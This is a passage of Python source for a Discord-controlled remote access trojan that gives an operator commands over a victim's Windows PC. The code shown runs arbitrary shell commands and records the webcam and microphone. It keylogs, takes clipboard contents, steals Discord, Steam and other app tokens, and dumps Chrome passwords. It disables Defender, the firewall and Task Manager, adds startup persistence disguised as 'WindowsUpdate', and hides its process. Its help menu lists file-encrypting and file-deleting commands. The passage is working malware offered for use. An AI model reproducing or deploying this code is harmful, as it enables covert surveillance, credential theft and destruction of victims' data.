                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
                    'mp3': '🎵', 'wav': '🎵', 'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
                    'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
                    'pdf': '📕', 'doc': '📘', 'docx': '📘', 'xls': '📊', 'xlsx': '📊',
                    'lua': '📜', 'json': '📋', 'xml': '📋', 'html': '🌐', 'css': '🎨', 'js': '⚡',
                    'iso': '💿', 'msi': '📦', 'bat': '💻', 'cmd': '💻', 'ps1': '💻',
                    'reg': '📝', 'ini': '📝', 'cfg': '📝', 'conf': '📝', 'log': '📋'
                }
                emoji = ext_emoji.get(ext, '📄')
                line = f"{emoji} {item['name']} ({size_str})"
            current_chunk.append(line)
            if len('\n'.join(current_chunk)) > 1800:
                chunks.append('\n'.join(current_chunk[:-1]))
                current_chunk = [line]
        if current_chunk:
            chunks.append('\n'.join(current_chunk))
        if not chunks:
            await send_embed(ctx, f"📁 {directory}", "Directory is empty", discord.Color.blue())
            return
        total_files = len([i for i in items if i['type'] != 'folder'])
        total_folders = len([i for i in items if i['type'] == 'folder'])
        embed = discord.Embed(title=f"📁 {directory}", description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}", color=discord.Color.blue())
        if len(chunks) > 1:
            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory} for more")
        await ctx.send(embed=embed)
        for i, chunk in enumerate(chunks[1:], start=2):
            embed = discord.Embed(title=f"📁 {directory} (continued)", description=chunk, color=discord.Color.blue())
            embed.set_footer(text=f"Showing {i}/{len(chunks)}")
            await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def run_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        embed = discord.Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.dark_grey())
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='mic')
@is_authorized()
async def mic_record(ctx, duration: int = 10):
    if not AUDIO_AVAILABLE:
        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
        return
    try:
        if duration > 60:
            duration = 60
        await send_embed(ctx, "Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
        path = record_mic(duration)
        if path and os.path.exists(path):
            with open(path, 'rb') as f:
                await ctx.send(file=discord.File(f))
            os.remove(path)
        else:
            await send_embed(ctx, "Error", "Failed to record microphone", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='camrec')
@is_authorized()
async def cam_record(ctx, duration: int = 10):
    """Record webcam video for X seconds (5-300)"""
    if duration < 5:
        duration = 5
    if duration > 300:
        duration = 300
    
    await send_embed(ctx, "📷 Webcam Recording", f"Recording for {duration} seconds...", discord.Color.blue())
    
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await send_embed(ctx, "❌ Error", "No webcam found", discord.Color.red())
            return
        
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = 20.0
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        output_path = os.environ['TEMP'] + "\\webcam_recording.avi"
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            frame_count += 1
            time.sleep(0.05)
        
        cap.release()
        out.release()
        
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            with open(output_path, 'rb') as f:
                await ctx.send(file=discord.File(f))
            os.remove(output_path)
            await send_embed(ctx, "✅ Success", f"Webcam recording complete ({frame_count} frames)", discord.Color.green())
        else:
            await send_embed(ctx, "❌ Error", "Failed to record webcam", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())

@bot.command(name='clipboard')
@is_authorized()
async def get_clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await send_embed(ctx, "Clipboard", f"```{data[:1000]}```", discord.Color.blue())
    except:
        await send_embed(ctx, "Clipboard", "No text or access failed", discord.Color.red())

@bot.command(name='geolocate')
@is_authorized()
async def geolocate(ctx):
    try:
        ip = requests.get('https://api.ipify.org').text
        r = requests.get(f'http://ip-api.com/json/{ip}')
        data = r.json()
        embed = discord.Embed(title="Geolocation", color=discord.Color.green())
        embed.add_field(name="IP", value=data.get('query', ip))
        embed.add_field(name="City", value=data.get('city', 'N/A'))
        embed.add_field(name="Country", value=data.get('country', 'N/A'))
        embed.add_field(name="ISP", value=data.get('isp', 'N/A'))
        embed.add_field(name="Map", value=f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}")
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='website')
@is_authorized()
async def open_website(ctx, *, url: str):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        os.startfile(url)
        await send_embed(ctx, "Website", f"Opened {url}", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='disabletaskmgr')
@is_authorized()
async def disable_taskmgr(ctx):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager", "Disabled", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='enabletaskmgr')
@is_authorized()
async def enable_taskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager", "Enabled", discord.Color.green())
    except:
        await send_embed(ctx, "Task Manager", "Already enabled", discord.Color.orange())

@bot.command(name='listprocess')
@is_authorized()
async def list_process(ctx):
    try:
        output = "```\n"
        for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
            try:
                output += f"{proc.info['pid']:6} | {proc.info['name'][:25]:25} | {proc.info['memory_percent']:5.1f}%\n"
                if len(output) > 1500:
                    output += "```"
                    await ctx.send(output)
                    output = "```\n"
            except:
                pass
        if len(output) > 4:
            await ctx.send(output + "```")
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='prockill')
@is_authorized()
async def proc_kill(ctx, *, name: str):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == name.lower():
                proc.kill()
                await send_embed(ctx, "Killed", f"{name} (PID: {proc.info['pid']})", discord.Color.red())
                return
        await send_embed(ctx, "Not Found", name, discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='disabledefender')
@is_authorized()
async def disable_defender(ctx):
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
        subprocess.run('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True, capture_output=True)
        await send_embed(ctx, "Defender", "Disabled (reboot may be needed)", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='disablefirewall')
@is_authorized()
async def disable_firewall(ctx):
    try:
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
        await send_embed(ctx, "Firewall", "Disabled", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='persistence')
@is_authorized()
async def persistence(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        await send_embed(ctx, "Persistence", "Added to startup", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='killswitch')
@is_authorized()
async def killswitch(ctx):
    global keylog_active
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
    except:
        pass
    keylog_active = False
    if os.path.exists(keylog_file):
        os.remove(keylog_file)
    await send_embed(ctx, "Killswitch", "Traces cleaned, exiting", discord.Color.red())
    sys.exit(0)

@bot.command(name='keylog')
@is_authorized()
async def keylog_cmd(ctx, action: str = None):
    global keylog_active
    if action == 'start':
        if keylog_active:
            await send_embed(ctx, "Keylog", "Already running", discord.Color.orange())
            return
        thread = threading.Thread(target=start_keylog, daemon=True)
        thread.start()
        keylog_active = True
        await send_embed(ctx, "Keylog", "Started", discord.Color.green())
    elif action == 'stop':
        keylog_active = False
        await send_embed(ctx, "Keylog", "Stopped", discord.Color.orange())
    elif action == 'dump':
        if os.path.exists(keylog_file):
            with open(keylog_file, 'r', encoding='utf-8') as f:
                data = f.read()
            if len(data) > 1900:
                await ctx.send(file=discord.File(keylog_file))
            else:
                await send_embed(ctx, "Keylog Dump", f"```{data}```", discord.Color.blue())
        else:
            await send_embed(ctx, "Keylog", "No logs", discord.Color.red())
    else:
        await send_embed(ctx, "Usage", "!keylog start/stop/dump", discord.Color.orange())

@bot.command(name='keylogstart')
@is_authorized()
async def keylog_start(ctx):
    await keylog_cmd(ctx, 'start')

@bot.command(name='keylogstop')
@is_authorized()
async def keylog_stop(ctx):
    await keylog_cmd(ctx, 'stop')

@bot.command(name='keylogdump')
@is_authorized()
async def keylog_dump(ctx):
    if os.path.exists(keylog_file):
        with open(keylog_file, 'r', encoding='utf-8') as f:
            data = f.read()
        if len(data) > 1900:
            await ctx.send(file=discord.File(keylog_file))
        else:
            await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
    else:
        await send_embed(ctx, "⌨️ Keylog", "No logs found", discord.Color.red())

@bot.command(name='keylogclear')
@is_authorized()
async def keylog_clear(ctx):
    if os.path.exists(keylog_file):
        os.remove(keylog_file)
        await send_embed(ctx, "⌨️ Keylog", "Logs cleared", discord.Color.green())
    else:
        await send_embed(ctx, "⌨️ Keylog", "No logs to clear", discord.Color.orange())

@bot.command(name='keylogstatus')
@is_authorized()
async def keylog_status(ctx):
    status = "🟢 Running" if keylog_active else "🔴 Stopped"
    await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())

@bot.command(name='grabtokens')
@is_authorized()
async def grab_tokens(ctx):
    await send_embed(ctx, "🔍 Scanning for Tokens", "Checking all installed apps...", discord.Color.blue())
    tokens, detected = grab_all_tokens()
    
    if detected:
        detected_str = "✅ Detected: " + ", ".join(detected)
    else:
        detected_str = "❌ No token-bearing apps detected"
    
    if tokens and tokens != ["No tokens found"]:
        output = "\n".join(tokens[:50])
        if len(output) > 1900:
            with open("tokens.txt", "w", encoding='utf-8') as f:
                f.write("\n".join(tokens))
            await ctx.send(file=discord.File("tokens.txt"))
            os.remove("tokens.txt")
        else:
            embed = discord.Embed(title="🔑 Tokens Found", description=f"```{output}```", color=discord.Color.green())
            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
            embed.add_field(name="📈 Total Tokens", value=str(len(tokens)), inline=True)
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔑 No Tokens Found", color=discord.Color.red())
        embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
        await ctx.send(embed=embed)

@bot.command(name='password')
@is_authorized()
async def chrome_passwords(ctx):
    if not CRYPTO_AVAILABLE:
        await send_embed(ctx, "Error", "pycryptodome not installed - password decryption unavailable", discord.Color.red())
        return
    await send_embed(ctx, "Dumping", "Chrome passwords...", discord.Color.blue())
    passwords = get_chrome_passwords()
    if passwords and passwords != ["No passwords found"] and passwords != ["pycryptodome not installed"]:
        output = "\n".join(passwords)
        if len(output) > 1900:
            with open("passwords.txt", "w", encoding='utf-8') as f:
                f.write(output)
            await ctx.send(file=discord.File("passwords.txt"))
            os.remove("passwords.txt")
        else:
            await send_embed(ctx, "🔑 Chrome Passwords", f"```{output[:1500]}```", discord.Color.green())
    else:
        await send_embed(ctx, "Passwords", passwords[0] if passwords else "None found", discord.Color.red())

@bot.command(name='idletime')
@is_authorized()
async def idle_time(ctx):
    idle = get_idle_time()
    await send_embed(ctx, "Idle Time", idle, discord.Color.blue())

@bot.command(name='webcampic')
@is_authorized()
async def webcam_pic(ctx):
    await send_embed(ctx, "Capturing", "Webcam...", discord.Color.blue())
    path = capture_webcam()
    if path and os.path.exists(path):
        with open(path, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(path)
    else:
        await send_embed(ctx, "Webcam", "Failed or no camera", discord.Color.red())

@bot.command(name='wallpaper')
@is_authorized()
async def change_wallpaper(ctx):
    if not ctx.message.attachments:
        await send_embed(ctx, "Wallpaper", "Attach an image", discord.Color.orange())
        return
    path = os.environ['TEMP'] + "\\wallpaper.jpg"
    await ctx.message.attachments[0].save(path)
    set_wallpaper(path)
    await send_embed(ctx, "Wallpaper", "Changed", discord.Color.green())

@bot.command(name='blockinput')
@is_authorized()
async def block_input_cmd(ctx):
    if not is_admin():
        await send_embed(ctx, "Error", "Admin required", discord.Color.red())
        return
    block_input(True)
    await send_embed(ctx, "Input", "Blocked (keyboard/mouse)", discord.Color.red())

@bot.command(name='unblockinput')
@is_authorized()
async def unblock_input_cmd(ctx):
    block_input(False)
    await send_embed(ctx, "Input", "Unblocked", discord.Color.green())

@bot.command(name='critical')
@is_authorized()
async def critical_proc(ctx):
    if not is_admin():
        await send_embed(ctx, "Error", "Admin required", discord.Color.red())
        return
    if make_critical():
        await send_embed(ctx, "Critical", "Process is now critical - closing will BSOD", discord.Color.red())
    else:
        await send_embed(ctx, "Critical", "Failed", discord.Color.red())

@bot.command(name='rootkit')
@is_authorized()
async def rootkit_cmd(ctx):
    if hide_process():
        await send_embed(ctx, "Rootkit", "Process hidden (svchost.exe)", discord.Color.green())
    else:
        await send_embed(ctx, "Rootkit", "Admin required", discord.Color.red())

@bot.command(name='cd')
@is_authorized()
async def change_dir(ctx, path: str = None):
    global current_path
    if not path:
        await send_embed(ctx, "Current Dir", current_path, discord.Color.blue())
        return
    new_path = path if os.path.isabs(path) else os.path.join(current_path, path)
    if os.path.exists(new_path) and os.path.isdir(new_path):
        current_path = new_path
        await send_embed(ctx, "Changed", current_path, discord.Color.green())
    else:
        await send_embed(ctx, "Error", "Invalid path", discord.Color.red())

@bot.command(name='upload')
@is_authorized()
async def upload_file(ctx):
    if not ctx.message.attachments:
        await send_embed(ctx, "Upload", "Attach a file", discord.Color.orange())
        return
    path = os.path.join(current_path, ctx.message.attachments[0].filename)
    await ctx.message.attachments[0].save(path)
    await send_embed(ctx, "Uploaded", path, discord.Color.green())

@bot.command(name='download')
@is_authorized()
async def download_file(ctx, *, filepath: str):
    try:
        if not os.path.isabs(filepath):
            filepath = os.path.join(current_path, filepath)
        filepath = os.path.normpath(filepath)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            if os.path.getsize(filepath) > 104857600:
                await send_embed(ctx, "Error", "File >100MB", discord.Color.red())
                return
            await ctx.send(file=discord.File(filepath))
        else:
            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def exit_bot(ctx):
    await send_embed(ctx, "Exiting", "Goodbye", discord.Color.dark_grey())
    sys.exit(0)

@bot.command(name='downloads')
@is_authorized()
async def recent_downloads(ctx):
    downloads = get_recent_downloads()
    output = "\n".join(downloads[:30])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "📥 Recent Downloads", output, discord.Color.blue())

@bot.command(name='installed')
@is_authorized()
async def installed_programs(ctx):
    await send_embed(ctx, "📦 Getting installed programs...", "This may take a moment", discord.Color.blue())
    programs = get_installed_programs()
    output = "\n".join(programs[:100])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "📦 Installed Programs", f"```{output}```", discord.Color.green())

@bot.command(name='shake')
@is_authorized()
async def shake_cursor(ctx, duration: int = 10):
    global shake_active
    if duration < 5:
        duration = 5
    if duration > 300:
        duration = 300
    if shake_active:
        await send_embed(ctx, "❌ Error", "Shake already running", discord.Color.red())
        return
    if start_shake(duration):
        await send_embed(ctx, "🔄 Cursor Shake", f"Started for {duration} seconds", discord.Color.blue())
    else:
        await send_embed(ctx, "❌ Error", "Could not start shake", discord.Color.red())

@bot.command(name='shakestop')
@is_authorized()
async def shake_stop(ctx):
    global shake_active
    if stop_shake():
        await send_embed(ctx, "⏹️ Shake Stopped", "Cursor shake has been stopped", discord.Color.green())
    else:
        await send_embed(ctx, "❌ Error", "No shake running", discord.Color.red())

@bot.command(name='mute')
@is_authorized()
async def mute_audio(ctx):
    try:
        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
        await send_embed(ctx, "🔇 Muted", "System audio has been muted", discord.Color.red())
    except:
        await send_embed(ctx, "❌ Error", "Could not mute audio", discord.Color.red())

@bot.command(name='unmute')
@is_authorized()
async def unmute_audio(ctx):
    try:
        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
        await send_embed(ctx, "🔊 Unmuted", "System audio has been unmuted", discord.Color.green())
    except:
        await send_embed(ctx, "❌ Error", "Could not unmute audio", discord.Color.red())

@bot.command(name='capslock')
@is_authorized()
async def caps_lock_toggle(ctx):
    try:
        pyautogui.press('capslock')
        await send_embed(ctx, "🔠 Caps Lock", "Toggled caps lock", discord.Color.blue())
    except:
        await send_embed(ctx, "❌ Error", "Could not toggle caps lock", discord.Color.red())

@bot.command(name='capslockon')
@is_authorized()
async def caps_lock_on(ctx):
    try:
        if ctypes.windll.user32.GetKeyState(0x14) & 0x0001:
            await send_embed(ctx, "🔠 Caps Lock", "Already ON", discord.Color.orange())
            return
        pyautogui.press('capslock')
        await send_embed(ctx, "🔠 Caps Lock", "Turned ON", discord.Color.blue())
    except:
        await send_embed(ctx, "❌ Error", "Could not turn caps lock on", discord.Color.red())

@bot.command(name='capslockoff')
@is_authorized()
async def caps_lock_off(ctx):
    try:
        if not (ctypes.windll.user32.GetKeyState(0x14) & 0x0001):
            await send_embed(ctx, "🔠 Caps Lock", "Already OFF", discord.Color.orange())
            return
        pyautogui.press('capslock')
        await send_embed(ctx, "🔠 Caps Lock", "Turned OFF", discord.Color.blue())
    except:
        await send_embed(ctx, "❌ Error", "Could not turn caps lock off", discord.Color.red())

@bot.command(name='fullscreenlock')
@is_authorized()
async def fullscreen_lock(ctx):
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        await send_embed(ctx, "🖥️ Fullscreen Lock", "Taskbar hidden. Use !fullscreenunlock to restore", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())

@bot.command(name='fullscreenunlock')
@is_authorized()
async def fullscreen_unlock(ctx):
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 1)
        await send_embed(ctx, "🖥️ Fullscreen Unlocked", "Taskbar restored", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())

@bot.command(name='downloadsfolder')
@is_authorized()
async def list_downloads_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Downloads')
    await list_files(ctx, path)

@bot.command(name='documentsfolder')
@is_authorized()
async def list_documents_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Documents')
    await list_files(ctx, path)

@bot.command(name='picturesfolder')
@is_authorized()
async def list_pictures_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Pictures')
    await list_files(ctx, path)

@bot.command(name='videosfolder')
@is_authorized()
async def list_videos_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Videos')
    await list_files(ctx, path)

@bot.command(name='desktopfolder')
@is_authorized()
async def list_desktop_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Desktop')
    await list_files(ctx, path)

@bot.command(name='help')
async def help_cmd(ctx):
    embed = discord.Embed(
        title="Commands",
        description="A list of commands you can run to control the target PC.",
        color=discord.Color.purple()
    )
    
    categories = {
        "🔧 Config": [
            f"**Prefix:** `{Config.PREFIX}`",
            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>",
            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
        ],
        "ℹ️ System Info": [
            "`info` - Get advanced system information (HWID, CPU, GPU, RAM, IP, WiFi passwords)",
            "`sysinfo` - Alias for info",
            "`idletime` - Check how long the user has been idle",
            "`geolocate` - Get IP geolocation (city, country, ISP, map link)"
        ],
        "💀 Destructive": [
            "`lock` - Locks the PC (requires admin)",
            "`crash` - Blue screens the PC (requires admin)",
            "`filescramble` - Renames all personal files randomly",
            "`filedestroy` - Deletes all personal files (⚠️ DANGEROUS)",
            "`fileransom` - Encrypts all personal files (⚠️ DANGEROUS)",
            "`virus` - Displays 10 fake virus warning popups",
            "`delete <file>` - Delete a specific file"
        ],
        "💬 Messages & Alerts": [
            "`voice <message>` - Text-to-speech message",
            "`msgbox <message>` - Message box popup on target PC",
            "`rickroll` - Opens Rickroll video in browser"
        ],
        "🎮 Control & Commands": [
            "`screenshot [name]` - Take screenshot",
            "`open <app>` - Open application (notepad, calc, chrome, cmd)",
            "`close <app>` - Close application by name",
            "`listapps [limit]` - List running applications",
            "`cmd <command>` - Run a CMD command on target",
            "`website <url>` - Open a website in browser"
        ],
        "🖱️ Mouse & Keyboard": [
            "`click [left|right|middle]` - Perform mouse click",
            "`press <keys>` - Press keys (e.g. ctrl+c, alt+f4)",
            "`blockinput` - Block keyboard/mouse (requires admin)",
            "`unblockinput` - Unblock keyboard/mouse",
            "`shake <seconds>` - Shake cursor rapidly (5-300s)",
            "`shakestop` - Stop cursor shaking"
        ],
        "⚡ Power Control": [
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
            "`critical` - Make process critical (admin, closing causes BSOD)",
            "`rootkit` - Hide process as svchost.exe (admin)"
        ],
        "🎵 Media & Audio": [
            "`playpause` - Play/Pause media",
            "`nexttrack` - Skip to next track",
            "`mute` - Mute system audio",
            "`unmute` - Unmute system audio",
            "`capslock` - Toggle caps lock",
            "`capslockon` - Turn caps lock ON",
            "`capslockoff` - Turn caps lock OFF"
        ],
        "🖥️ Display": [
            "`fullscreenlock` - Hide taskbar (fullscreen lock)",
            "`fullscreenunlock` - Show taskbar",
            "`wallpaper` - Change wallpaper (attach image to command)"
        ],
        "📂 Files & Navigation": [
            "`cd <path>` - Change current directory",
            "`dir` - List current directory",
            "`listfiles <directory>` - List files with sizes and emojis",
            "`download <file>` - Download a file from target",
            "`upload` - Upload a file (attach to command)",
            "`downloads` - Show recent downloads",
            "`installed` - List installed programs",
            "`downloadsfolder` - List Downloads folder",
            "`documentsfolder` - List Documents folder",
            "`picturesfolder` - List Pictures folder",
            "`videosfolder` - List Videos folder",
            "`desktopfolder` - List Desktop folder"
        ],
        "🎥 Surveillance": [
            "`webcampic` - Take webcam photo",
            "`camrec <seconds>` - Record webcam video (5-300s)",
            "`mic <seconds>` - Record microphone (5-60s, requires PyAudio)",
            "`screenshot` - Take screenshot",
            "`clipboard` - Get clipboard contents",
            "`keylog start/stop/dump` - Keylogger control",
            "`keylogstart` - Start keylogger",
            "`keylogstop` - Stop keylogger",
            "`keylogdump` - Dump keylogger logs",
            "`keylogclear` - Clear keylogger logs",
            "`keylogstatus` - Check keylogger status"
        ],
        "🔐 Security & Stealing": [
            "`grabtokens` - Grab tokens from: Discord, Telegram, Steam, Chrome, Epic Games, Minecraft, Spotify, GitHub, Riot Games",
            "`password` - Dump Chrome saved passwords (requires pycryptodome)",
            "`disabledefender` - Disable Windows Defender (admin)",
            "`disablefirewall` - Disable Windows Firewall (admin)",
            "`disabletaskmgr` - Disable Task Manager",
            "`enabletaskmgr` - Enable Task Manager"
        ],
        "⚙️ Process Management": [
            "`listprocess` - List all running processes with PID",
            "`prockill <name>` - Kill a process by name"
        ],
        "🔁 Persistence": [
            "`persistence` - Add to startup registry",
            "`startup add/remove` - Add/remove from startup",
            "`killswitch` - Clean traces and exit"
        ],
        "🤖 Bot": [
            "`exit` - Closes the RAT and exits"
        ]
    }
    
    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands),
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='startup')
@is_authorized()
async def startup_cmd(ctx, action: str = None):
    if action == 'add':
        add_to_startup()
        await send_embed(ctx, "Startup", "Added", discord.Color.green())
    elif action == 'remove':
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            winreg.CloseKey(key)
            await send_embed(ctx, "Startup", "Removed", discord.Color.green())
        except:
            await send_embed(ctx, "Startup", "Not found", discord.Color.orange())
    else:
        await send_embed(ctx, "Usage", "!startup add/remove", discord.Color.orange())

@bot.command(name='sysinfo')
@is_authorized()
async def sysinfo_cmd(ctx):
    await system_info(ctx)

@bot.command(name='dir')
@is_authorized()
async def dir_cmd(ctx):
    await list_files(ctx, current_path)

@bot.command(name='delete')
@is_authorized()
async def delete_file(ctx, *, filepath: str):
    try:
        if not os.path.isabs(filepath):
            filepath = os.path.join(current_path, filepath)
        filepath = os.path.normpath(filepath)
        if os.path.exists(filepath):
            os.remove(filepath)
            await send_embed(ctx, "Deleted", filepath, discord.Color.red())
        else:
            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await send_embed(ctx, "Unknown Command", f"Use `{Config.PREFIX}help`", discord.Color.red())

if __name__ == "__main__":
    if Config.STARTUP:
        add_to_startup()
    bot.run(Config.TOKEN)
